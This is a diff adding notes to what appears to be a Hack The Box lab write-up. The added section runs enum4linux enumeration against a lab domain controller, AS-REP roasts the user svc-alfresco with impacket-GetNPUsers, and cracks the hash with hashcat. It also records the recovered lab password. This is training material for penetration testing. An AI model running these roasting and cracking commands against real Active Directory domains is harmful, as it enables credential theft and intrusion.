@@ -49,3 +49,37 @@ ldapsearch -H ldap://10.10.10.161 -x -b 'DC=htb,DC=local' "(&(objectCategory=per
 >[!example]- Result
 >![[Pasted image 20250312003958.png]]
 
+## Enum4Linux
+- In order to get more info we can use [[enum4linux]] 
+```bash
+enum4linux -a 10.10.10.161 -w htb.local -A
+```
+>[!example]- Result
+>![[Pasted image 20250312013125.png]]
+>![[Pasted image 20250312013202.png]]
+>![[Pasted image 20250312013349.png]]
+
+
+Domain Sid: `S-1-5-21-3072663084-364016917-1341370565`
+New User found: `svc-alfresco`
+There are 2 Domains: `htb.local | buildin.local`
+
+## NPU users
+- Checking if any user have the flag 'UF_DONT_REQUIRE_PREAUTH' using [[impacket-GetNPUsers]], And we have a TGT
+```bash
+impacket-GetNPUsers htb.local/ -usersfile usersList -request -dc-ip 10.10.10.161
+```
+>[!example]- Result
+>![[Pasted image 20250312014340.png]]
+
+# Exploitation
+## Brute force
+- now we can use [[hashcat]] in order to get the plan text password behind this TGT
+```bash
+hashcat -m 18200 TGTsvc-alfresco /usr/share/wordlists/rockyou.txt --force
+```
+>[!example]- Result
+>![[Pasted image 20250312014849.png]]
+
+Credentials:`svc-alfresco:s3rvice`
+
